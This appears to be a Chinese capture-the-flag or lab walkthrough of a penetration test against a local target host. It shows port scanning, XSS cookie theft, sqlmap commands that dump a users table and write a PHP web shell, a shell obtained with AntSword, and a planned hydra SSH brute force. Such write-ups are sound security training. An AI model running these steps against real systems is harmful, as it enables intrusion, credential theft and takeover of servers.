# 端口发现
nmap -sP 192.168.31.0/24   或  arp-scan -l
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668820473637-42d75cbe-4683-46dd-becb-787c2e7bc6c9.png#averageHue=%2329323f&clientId=u777334e4-9c68-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=340&id=u5cce8f30&margin=%5Bobject%20Object%5D&name=image.png&originHeight=340&originWidth=813&originalType=binary&ratio=1&rotation=0&showTitle=false&size=90990&status=done&style=none&taskId=u4b1aea49-eee8-4d56-84fd-5b164d2ec78&title=&width=813)
nmap -p- -A 192.168.31.152
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668820626229-574964e6-def4-4ae5-9e52-9ce034da6711.png#averageHue=%232b3644&clientId=u777334e4-9c68-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=287&id=uc00f6250&margin=%5Bobject%20Object%5D&name=image.png&originHeight=287&originWidth=653&originalType=binary&ratio=1&rotation=0&showTitle=false&size=72923&status=done&style=none&taskId=u46da463d-fc32-4b98-945d-36715ec6d6b&title=&width=653)
# web 突破
dirb 扫目录
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668820910101-3a8d8626-fa80-4cbf-bf42-92ac56a7c9ae.png#averageHue=%232f3f50&clientId=u777334e4-9c68-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=466&id=u43626067&margin=%5Bobject%20Object%5D&name=image.png&originHeight=466&originWidth=620&originalType=binary&ratio=1&rotation=0&showTitle=false&size=170743&status=done&style=none&taskId=u781b75a9-7631-4a64-99e4-ce380f0fcb6&title=&width=620)
对返回值为 200 的都看一下
管理员登陆界面 /admin/login.php
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668820994726-5e92e72a-a1b3-4fac-8c0f-d5cd3fac6b2a.png#averageHue=%23fbfbf6&clientId=u777334e4-9c68-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=366&id=u4537cfc7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=366&originWidth=1169&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25192&status=done&style=none&taskId=ue1517b2b-bff4-425d-bbfe-e5baa90bbc8&title=&width=1169)
post 界面
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668821015210-d19435fd-55d0-4f1c-944a-d8b543cffed8.png#averageHue=%23fbfbf7&clientId=u777334e4-9c68-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=340&id=u36c06446&margin=%5Bobject%20Object%5D&name=image.png&originHeight=340&originWidth=1128&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26790&status=done&style=none&taskId=u89555b20-b7a8-4e8f-890f-48e710ab8fd&title=&width=1128)

页面提示缺少参数 id
尝试 id=1  id=2
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668821089862-d276387c-769c-419e-ac42-70dc659ff3b7.png#averageHue=%23fcfcfc&clientId=u777334e4-9c68-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=649&id=uc1e87f5e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=649&originWidth=1149&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36367&status=done&style=none&taskId=u2dce13cb-65be-4581-b77d-efa4a0d9027&title=&width=1149)
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668821106406-95c3208a-2442-4298-bea2-fe61cf5fef90.png#averageHue=%23fcfcfc&clientId=u777334e4-9c68-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=649&id=uf20ff29f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=649&originWidth=1133&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33656&status=done&style=none&taskId=ue7202aa2-cd3b-4edc-a587-c517b616b6c&title=&width=1133)
从 id=3 开始往后就没了，尝试 sql 注入但无回显
_通常可以使用 <script>alert(1)</script> 来检测页面中是否包含 XSS 漏洞，但容易 WAF 或其他安全防御机制过滤，使用 '">< 可以在一定程度上避免这个问题_
_根据提交返回的结果可以判断是否存在漏洞，当特殊符号被编码时将会增加 XSS 攻击的难度，甚至可能就不存在 XSS 漏洞_
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668821296548-319610d9-4afc-4ab9-b4f4-bf91a44d375e.png#averageHue=%23f7f3f2&clientId=u777334e4-9c68-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=206&id=ua7cf29f7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=206&originWidth=958&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17967&status=done&style=none&taskId=u945d5978-f3b4-4ab6-b35b-9e9c270e5fd&title=&width=958)
尝试提交 qqq'"><
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668821337440-18c63daa-26fe-4b31-a3f8-980f2baee98b.png#averageHue=%23fefdfd&clientId=u777334e4-9c68-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=150&id=u5cd35807&margin=%5Bobject%20Object%5D&name=image.png&originHeight=150&originWidth=344&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3687&status=done&style=none&taskId=u07c31d05-edd8-4579-92d0-325d3b60efa&title=&width=344)
没有对特殊字符进行编码和过滤
尝试输入弹窗
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668821427792-5958bb9f-3073-4f15-836e-d84335206e66.png#averageHue=%23fdfdfc&clientId=u777334e4-9c68-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=403&id=u58c3f3ab&margin=%5Bobject%20Object%5D&name=image.png&originHeight=403&originWidth=749&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12927&status=done&style=none&taskId=u7132aee0-c93a-4db0-87a9-090a19f8bb1&title=&width=749)
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668821439354-b2093ee8-2bd6-4c43-966c-0c764c5ab472.png#averageHue=%233a6bac&clientId=u777334e4-9c68-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=353&id=u92e0cc1a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=353&originWidth=789&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10081&status=done&style=none&taskId=u510b7e57-3894-48bb-a7f1-972cf8f94d2&title=&width=789)
xss 可利用，尝试利用 xss 获取管理员 cookie
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668821691261-6d0667e1-72ef-4af4-a067-3af4a3fc7484.png#averageHue=%23fdfcfc&clientId=u777334e4-9c68-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=421&id=udf7c1691&margin=%5Bobject%20Object%5D&name=image.png&originHeight=421&originWidth=798&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14750&status=done&style=none&taskId=u74466618-ef73-4768-bc30-57576760b45&title=&width=798)
kali 开启监听
点击提交后首先监听到主机的 cookie
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668822398987-0a481aca-70f7-4e66-843d-384562a59997.png#averageHue=%232a3441&clientId=u777334e4-9c68-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=241&id=uafcd0d97&margin=%5Bobject%20Object%5D&name=image.png&originHeight=241&originWidth=891&originalType=binary&ratio=1&rotation=0&showTitle=false&size=71940&status=done&style=none&taskId=uce9b68f9-cbd3-4c15-a402-11fbd4ac26b&title=&width=891)
然后 重现监听，一段时间后，监听到来自靶机的 cookie
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668822444966-62fc264c-67b0-4425-9e00-73d942ac5535.png#averageHue=%23293441&clientId=u777334e4-9c68-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=261&id=u8761eb09&margin=%5Bobject%20Object%5D&name=image.png&originHeight=261&originWidth=664&originalType=binary&ratio=1&rotation=0&showTitle=false&size=62023&status=done&style=none&taskId=u2a2fc15a-8cb0-4511-85e9-86eb35db430&title=&width=664)
将 cookie 复制，进入 /admin 页面，使用 cookie 编译器修改 cookie
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668822498134-1b0499f6-d3ad-477e-923d-07e3e3e1917d.png#averageHue=%23edebeb&clientId=u777334e4-9c68-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=324&id=u7c5aad6b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=324&originWidth=559&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13261&status=done&style=none&taskId=uafa26639-bbb6-4635-bfec-3df5f76adc4&title=&width=559)
修改完保存，点击 登录，成功登录
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668822679778-6eb18fd0-92d0-44d8-87d7-ee16cea8f614.png#averageHue=%23faf9f9&clientId=u777334e4-9c68-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=377&id=u617965cc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=377&originWidth=1245&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35207&status=done&style=none&taskId=u59251141-dcba-4aca-a0ea-0deb5caca47&title=&width=1245)
点击 编辑
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668822752961-9dbd2307-dbd4-4036-a6aa-066f21d04fb0.png#averageHue=%23fbfbfa&clientId=u777334e4-9c68-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=414&id=uf59f0853&margin=%5Bobject%20Object%5D&name=image.png&originHeight=414&originWidth=1440&originalType=binary&ratio=1&rotation=0&showTitle=false&size=39089&status=done&style=none&taskId=u92d8de7c-df64-427f-b70d-fb27032e9f5&title=&width=1440)
这里编辑的内容会在主页显示，和主页内容一样，所以这里的数据会进数据库
url 也是通过 id 传参，尝试 sql 注入
发现有回显
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668822793708-7c032442-738e-46ad-b6fc-d96a1530f238.png#averageHue=%23faf9f6&clientId=u777334e4-9c68-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=444&id=u4ec21038&margin=%5Bobject%20Object%5D&name=image.png&originHeight=444&originWidth=1423&originalType=binary&ratio=1&rotation=0&showTitle=false&size=48587&status=done&style=none&taskId=u1e03f026-f53d-43dc-b066-8d865577d87&title=&width=1423)
准备 sql 注入，先抓个包
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668823003786-89134780-77a7-4925-bbd1-1043d55949bd.png#averageHue=%23f7f6f6&clientId=u777334e4-9c68-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=259&id=u2266ba84&margin=%5Bobject%20Object%5D&name=image.png&originHeight=259&originWidth=880&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32572&status=done&style=none&taskId=ucb4ed0da-e70f-4028-85bf-8d82742d796&title=&width=880)
复制下来放到 kali
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668823043749-d3d78879-098f-406e-99d4-45991dcc01f3.png#averageHue=%23252934&clientId=u777334e4-9c68-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=303&id=u7acfebbd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=303&originWidth=844&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69116&status=done&style=none&taskId=u6b3963fb-d536-475b-b8fb-da00d3f9062&title=&width=844)
url 后面改为 *
保存
sqlmap -r requests.txt --dbs --batch
_也可以不抓包，直接  sqlmap -u "http://192.168.31.152/admin/edit.php?id=1*" --cookie "PHPSESSID=1q9cg0020cqe432kjokku43p51"  _
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668823124512-94819b21-847e-4b73-8915-6b89a2645f96.png#averageHue=%23272e3b&clientId=u777334e4-9c68-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=119&id=ue53c1868&margin=%5Bobject%20Object%5D&name=image.png&originHeight=119&originWidth=423&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18564&status=done&style=none&taskId=u5bbec303-41e9-4aa6-851d-0f89b0d7e5e&title=&width=423)
查询当前使用的数据库
sqlmap -r requests.txt --current-db --batch
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668823275717-df041caf-2f92-4c92-ba3f-dd6d89c49d3a.png#averageHue=%232b3644&clientId=u777334e4-9c68-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=121&id=u9c68b851&margin=%5Bobject%20Object%5D&name=image.png&originHeight=121&originWidth=383&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26904&status=done&style=none&taskId=u3069dcb7-f0ed-4177-bb10-b956419876d&title=&width=383)
爆出 blog 库中的表
sqlmap -r requests.txt -D "blog" --tables --batch
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668823333793-5291f6f5-67ca-4cdc-b45d-a433e8b93376.png#averageHue=%23252a36&clientId=u777334e4-9c68-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=147&id=ud9607139&margin=%5Bobject%20Object%5D&name=image.png&originHeight=147&originWidth=352&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14524&status=done&style=none&taskId=u27b573ff-0b0c-40be-81f3-ddc9644d3b3&title=&width=352)
爆出 users 表的字段
sqlmap -r requests.txt -D "blog" -T "users" --columns --batch
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668823373237-d73be0d2-9d4e-413a-bf2d-30dbe0fce46e.png#averageHue=%23262b37&clientId=u777334e4-9c68-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=193&id=u7c67cadb&margin=%5Bobject%20Object%5D&name=image.png&originHeight=193&originWidth=378&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23161&status=done&style=none&taskId=u1703bc7b-57d9-4658-9adf-8297730e8a5&title=&width=378)
dump 出 login 和 password 字段
sqlmap -r requests.txt -D "blog" -T "users" -C "login,password" --dump --batch
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668823452650-b29a820b-afa3-47b1-9cfb-a5ab6f929232.png#averageHue=%23262b37&clientId=u777334e4-9c68-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=182&id=ube0bea60&margin=%5Bobject%20Object%5D&name=image.png&originHeight=182&originWidth=618&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30367&status=done&style=none&taskId=ua14b6649-f094-4a96-a907-a7ff8dd1ce9&title=&width=618)
得到账户密码 admin：P4ssw0rd （md5 解密）
查看当前用户
sqlmap -r requests.txt --current-user --batch
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668823755974-73627584-572f-4850-a05d-bd4e2505ddfa.png#averageHue=%232b3746&clientId=u777334e4-9c68-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=68&id=u4b493295&margin=%5Bobject%20Object%5D&name=image.png&originHeight=68&originWidth=405&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16736&status=done&style=none&taskId=u7e2b0f33-8beb-41e6-b6a9-c59073f29c5&title=&width=405)
既然是 root，尝试写入一句话木马
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668824081249-03f488a1-19f8-4ab0-8d54-48cab992dd15.png#averageHue=%232a3342&clientId=u777334e4-9c68-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=63&id=ub852ce8b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=63&originWidth=332&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9737&status=done&style=none&taskId=ud4ba00fc-de4b-4760-b614-01ea5b60fb3&title=&width=332)
sqlmap -r requests.txt --file-write="ma.php" --file-dest="/var/www/html/ma.php"
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668824158474-40bd02c0-0557-4cc0-911c-4d5d2e6845a7.png#averageHue=%232b3440&clientId=u777334e4-9c68-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=116&id=u3555a9bd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=116&originWidth=1242&originalType=binary&ratio=1&rotation=0&showTitle=false&size=48056&status=done&style=none&taskId=u70c566ea-6d3a-48b7-9bbd-54bb12b9ff9&title=&width=1242)
没有写入成功
可能是权限问题
换个路径
sqlmap -r requests.txt --file-write="ma.php" --file-dest="/var/www/css/ma.php"
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668824294046-db0b4139-b0ac-4bad-9192-d523e408e317.png#averageHue=%2329333f&clientId=u777334e4-9c68-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=137&id=u82c8ff2a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=137&originWidth=1042&originalType=binary&ratio=1&rotation=0&showTitle=false&size=52732&status=done&style=none&taskId=u6aa61c40-f8d4-4c93-8cdf-ae5cf7fb221&title=&width=1042)
写入成功
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668824376394-882d85c4-7b0d-468d-9513-de34a45d8a71.png#averageHue=%23f7f5f1&clientId=u777334e4-9c68-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=408&id=u076eb3c5&margin=%5Bobject%20Object%5D&name=image.png&originHeight=408&originWidth=777&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46739&status=done&style=none&taskId=u3fd579c5-80c1-4c02-8cf8-ead64d8b782&title=&width=777)
蚁剑连接
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668824556086-f2136cd4-5a7c-462b-9f4f-fa9333fbeff9.png#averageHue=%23eeeeee&clientId=u777334e4-9c68-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=299&id=u0bb337b7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=299&originWidth=1034&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34091&status=done&style=none&taskId=u1a6d3704-14b5-4335-9684-816081d5843&title=&width=1034)
连接成功
拿到 shell
# 提权
蚁剑打开终端
查看 /etc/passwd
![image.png](https://cdn.nlark.com/yuque/0/2022/png/23194752/1668824630070-525d24e5-2a09-47d5-989b-3aff8cb29423.png#averageHue=%230d0c0c&clientId=u777334e4-9c68-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=410&id=u9371dd60&margin=%5Bobject%20Object%5D&name=image.png&originHeight=410&originWidth=1011&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61220&status=done&style=none&taskId=uaa1639ca-3620-4998-93f1-5b014e067bc&title=&width=1011)
发现 user 用户和 root 用户使用同一个 bash
意思就是 user 就相当于是 root
使用 hydra 爆破 ssh 爆出 user 的密码
 

















